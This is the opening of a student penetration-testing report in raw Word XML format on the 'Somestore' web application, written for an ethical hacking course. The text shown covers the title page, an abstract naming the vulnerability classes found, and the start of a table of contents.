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3F5808" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="2220EC19" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="640E2F9B" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="0F4533D0" w14:textId="77777777" w:rsidR="00527338" w:rsidRDefault="00527338"/>
    <w:p w14:paraId="6CE1789E" w14:textId="77777777" w:rsidR="00A50E2A" w:rsidRDefault="009C5438" w:rsidP="00527338">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29BD1902" wp14:editId="56751F77">
            <wp:extent cx="3044825" cy="7588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4825" cy="758825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DD3F3C" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:tbl>
      <w:tblPr>
        <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="page" w:horzAnchor="margin" w:tblpXSpec="center" w:tblpY="5236"/>
        <w:tblW w:w="0" w:type="auto"/>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7283"/>
      </w:tblGrid>
      <w:tr w:rsidR="0022030D" w14:paraId="23BE874F" w14:textId="77777777" w:rsidTr="0022030D">
        <w:trPr>
          <w:cantSplit/>
          <w:trHeight w:val="4958"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7283" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="62CFA1C2" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="00C9138C" w:rsidP="0005417B">
            <w:pPr>
              <w:spacing w:after="0" w:line="260" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
              <w:t>Somestore Web Application Investigation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="527D7BD2" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3" w:rsidP="009627B3">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="33041A28" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="00C9138C" w:rsidP="00C9138C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>An Investigation into the vulnerabilities in the Somestore application.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F6C3577" w14:textId="77777777" w:rsidR="0022030D" w:rsidRPr="009627B3" w:rsidRDefault="00C9138C" w:rsidP="009627B3">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="40"/>
              </w:rPr>
              <w:t>By Connor Duncan</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="354BF444" w14:textId="77777777" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="0022030D" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>CMP</w:t>
            </w:r>
            <w:r w:rsidR="00C9138C">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>319</w:t>
            </w:r>
            <w:r w:rsidR="002E653A">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidR="00C9138C">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>Ethical hacking 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DE6ACF8" w14:textId="77777777" w:rsidR="0022030D" w:rsidRPr="00C9138C" w:rsidRDefault="009627B3" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="30"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C9138C">
              <w:rPr>
                <w:b/>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>BSc Ethical Hacking</w:t>
            </w:r>
            <w:r w:rsidR="0022030D" w:rsidRPr="00C9138C">
              <w:rPr>
                <w:b/>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> Year </w:t>
            </w:r>
            <w:r w:rsidRPr="00C9138C">
              <w:rPr>
                <w:b/>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55867EE2" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="00C9138C" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>2018/19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F59A80E" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="0D91106F" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="113022A8" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="7EAE4093" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="7DF0346B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="0317F82B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="49983082" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="6E89CF7B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="37E993E0" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="16DACB53" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="62B6E58C" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="1D91271E" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="64967C05" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="7C20A8A6" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="0BF2EA89" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="011C3190" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="31A5FFBC" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="48509F65" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:p w14:paraId="57FFD1B3" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="0C1CA6AF" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="418CFD7B" w14:textId="638F3A1F" w:rsidR="0022030D" w:rsidRDefault="00AE0968">
      <w:r w:rsidRPr="00C015A8">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Note that Information contained in this document is for educational purposes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E53F9C" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="6DC61B09" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="0022030D">
      <w:pPr>
        <w:framePr w:hSpace="180" w:wrap="around" w:vAnchor="page" w:hAnchor="margin" w:xAlign="center" w:y="7553"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C3FB056" w14:textId="72878762" w:rsidR="00FF69A5" w:rsidRPr="00CA5897" w:rsidRDefault="00974F37" w:rsidP="003363BE">
      <w:pPr>
        <w:pStyle w:val="Abtracttitle"/>
        <w:rPr>
          <w:sz w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="00974F37">
        <w:t>Abstract</w:t>
      </w:r>
      <w:r w:rsidR="009627B3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441CB53F" w14:textId="58CB84DF" w:rsidR="000E1929" w:rsidRDefault="00176584">
      <w:r>
        <w:t>A we</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:t xml:space="preserve">b development company acquired the Somestore Web </w:t>
      </w:r>
      <w:r w:rsidR="005E1862">
        <w:t>application but</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> were concerned about any vulnerabilities and logic flaws contained within. An investigation</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:t xml:space="preserve"> to discover these vulnerabilities and logic flaws</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was carried out on the Somestore web application</w:t>
      </w:r>
      <w:r w:rsidR="000E1929">
        <w:t xml:space="preserve">. Several different tools are used throughout this process to help enumerate the application, find different vulnerabilities, and exploit </w:t>
      </w:r>
      <w:r w:rsidR="00C90A60">
        <w:t>the system.</w:t>
      </w:r>
      <w:r w:rsidR="000E1929">
        <w:t xml:space="preserve"> The Web Application Hacker’s Methodology</w:t>
      </w:r>
      <w:r w:rsidR="00510F46">
        <w:t>, taken from the Web Application Hacker’s Handbook 2</w:t>
      </w:r>
      <w:r w:rsidR="00510F46" w:rsidRPr="00510F46">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidR="00510F46">
        <w:t xml:space="preserve"> edition</w:t>
      </w:r>
      <w:r w:rsidR="001A29F9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A29F9" w:rsidRPr="001A29F9">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001A29F9" w:rsidRPr="001A29F9">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Stuttard</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001A29F9" w:rsidRPr="001A29F9">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Pinto, 2013)</w:t>
      </w:r>
      <w:r w:rsidR="00510F46">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="000E1929">
        <w:t xml:space="preserve"> is followed throughout the report.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D15CE2" w14:textId="00E7B262" w:rsidR="00176584" w:rsidRDefault="00FB3F0D">
      <w:r>
        <w:t>Several vulnerabilities and logic flaws with the application were found.</w:t>
      </w:r>
      <w:r w:rsidR="000E1929">
        <w:t xml:space="preserve"> T</w:t>
      </w:r>
      <w:r w:rsidR="00176584">
        <w:t>hese include, but are not limited to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F2B6E5" w14:textId="77777777" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Information leakage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706A5F1A" w14:textId="05EF18AA" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Username enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCF4D60" w14:textId="749BD13B" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Password guessing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD82921" w14:textId="4229B7AB" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Session hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AE94E0" w14:textId="17486BA9" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cross Site Request Forgery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519256ED" w14:textId="28946268" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Improper access control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761D9E2E" w14:textId="77777777" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Path Traversal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694A53FA" w14:textId="77777777" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63849508" w14:textId="05BD12A1" w:rsidR="00176584" w:rsidRDefault="000E1929" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cross site Scripting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70562D5E" w14:textId="77777777" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Open Redirection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35176AB5" w14:textId="77777777" w:rsidR="00176584" w:rsidRDefault="00176584" w:rsidP="00176584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Logic Flaws</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB5E71A" w14:textId="77A39BB6" w:rsidR="004C6BF5" w:rsidRDefault="00176584" w:rsidP="009A08ED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Dangerous HTTP Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279E329C" w14:textId="2220566C" w:rsidR="008A58E3" w:rsidRDefault="008A58E3" w:rsidP="009A08ED">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ABAE3E7" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="6EC6005D" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="3D08DBE8" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="17E93152" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="6815C8B0" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="26C10718" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="5639E08F" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="0568BAAD" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="1DCE2178" w14:textId="77777777" w:rsidR="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:p w14:paraId="07E6A8ED" w14:textId="77777777" w:rsidR="0048364F" w:rsidRPr="0048364F" w:rsidRDefault="0048364F" w:rsidP="0048364F"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:id w:val="-265923424"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="7B08627C" w14:textId="77777777" w:rsidR="00712DC9" w:rsidRPr="00712DC9" w:rsidRDefault="00BA7AE1" w:rsidP="003363BE">
          <w:pPr>
            <w:pStyle w:val="Abtracttitle"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b w:val="0"/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:t>+</w:t>
          </w:r>
          <w:r w:rsidR="00712DC9" w:rsidRPr="00974F37">
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="6EE7AB9F" w14:textId="697AA55A" w:rsidR="00616D9E" w:rsidRDefault="00404615">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00712DC9">
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc531104319" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104319 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="48AFEF84" w14:textId="067D6431" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104320" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Background and Aim</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104320 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2084856E" w14:textId="26D0D48B" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104321" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Methodology</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104321 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="16FF84B6" w14:textId="56CF12FB" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
